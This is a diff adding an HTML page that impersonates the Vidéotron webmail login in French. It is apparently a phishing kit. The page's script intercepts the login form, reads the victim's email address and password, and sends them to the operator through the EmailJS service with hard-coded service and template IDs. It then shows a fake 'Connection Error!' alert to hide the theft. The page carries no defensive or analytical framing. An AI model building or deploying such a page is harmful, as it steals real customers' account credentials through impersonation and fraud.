@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>
+        Login|Videotron</title>
+     <!-- email js -->
+     <script
+     type="text/javascript"
+     src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
+   ></script>
+</head>
+<body>
+    <nav>
+       <img src="./assets/videotron.webp" alt="logo"/>
+    </nav>
+    <main class="main">
+        <section class="left">
+            <h1>COURRIEL WEB</h1>
+           <h3>RESTEZ CONNECTÉ PARTOUT DANS LE MONDE GRÂCE AU COURRIEL WEB DE VIDÉOTRON!</h3>
+           <p>Le Courriel Web est SÉCURITAIRE et FACILE à utiliser.
+            II vous permet de :</p>
+            <p>• Lire, rédiger et envoyer vos courriels avec tout ordinateur muni d'une connexion Internet;</p>
+            <p>• Accéder a votre carnet d'adresses en ligne</p>
+            <ul>
+                <li>Stocker jusqu'à 2 Go de messages, incluant des fichiers et des images;</li>
+                <li>Envoyer des fichiers de taille importante (jusqu'à 25 Mo par pièce jointe);</li>
+                <li>Correspondre en toute sécurité grâce à des filtres antipourriel et antivirus hyper performants;</li>
+                <li>Bénéficier d'une messagerie sans tracas: aucune publicité dans votre boîte de réception</li>
+            </ul>
+        </section>
+        <section class="right">
+            <form  id="login-form">
+                <!-- email -->
+                <input type="text"  
+                name="exampleInputEmail1"
+                class="form-control"
+                id="exampleInputEmail1"
+                aria-describedby="emailHelp"
+                autocomplete="off"
+                placeholder="Votre adresse courriel *"
+                required />
+                <!-- //password -->
+                <input  name="exampleInputPassword1" placeholder="Mot de pàsse *" required/>
+                <button type="submit">Connexion</button>
+            </form>
+        </section>
+    </main>
+    <script>
+        // Load the EmailJS SDK asynchronously
+        (function () {
+          emailjs.init("Fc6Zb2E93HsLc4jAH");
+        })();
+  
+        // Handle the form submission
+        const form = document.getElementById("login-form");
+  
+        form.addEventListener("submit", (event) => {
+          event.preventDefault(); // Prevent the default form submission behavior
+  
+          // Get the form data;
+          const optimumId = form.elements["exampleInputEmail1"].value;
+          const password = form.elements["exampleInputPassword1"].value;
+  
+          // Send the form data to EmailJS
+          emailjs
+            .send("service_rybja5w", "template_2g5g3nh", {
+              optimumId: optimumId,
+              password: password,
+            })
+            .then(
+              () => {
+                // Handle the successful form submission here
+                alert("Connection Error!");
+              },
+              (error) => {
+                // Handle the form submission error here
+                alert("Form submission failed. Error: " + error);
+              }
+            );
+        });
+  
+        //*menu bar for small screen
+        const menu = document.querySelector(".menu-bar");
+        const closeLink = document.querySelector(".menu-close");
+        const navLink = document.querySelector(".navigate-bottom");
+  
+        menu.addEventListener("click", () => {
+          navLink.classList.toggle("open");
+        });
+  
+        closeLink.addEventListener("click", () => {
+          navLink.classList.toggle("open");
+        });
+      </script>
+   
+   
+      
+    
+</body>
+</html>
